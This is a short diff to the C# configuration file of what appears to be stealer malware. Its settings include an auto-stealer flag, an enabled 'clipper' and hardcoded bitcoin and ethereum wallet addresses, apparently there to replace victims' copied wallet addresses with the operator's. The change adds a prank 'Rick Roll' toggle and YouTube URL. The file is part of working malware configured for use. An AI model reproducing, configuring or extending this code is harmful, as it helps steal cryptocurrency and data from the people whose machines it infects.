@@ -64,6 +64,9 @@
         public static bool AutoStealerEnabled = false;
         // Clipper is enabled
         public static bool ClipperEnabled = true;
+	// Rick Roll
+	public static bool RickRollEnabled = true;
+	public static string RickRollUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         // Your wallet addresses
         public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";
         public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";
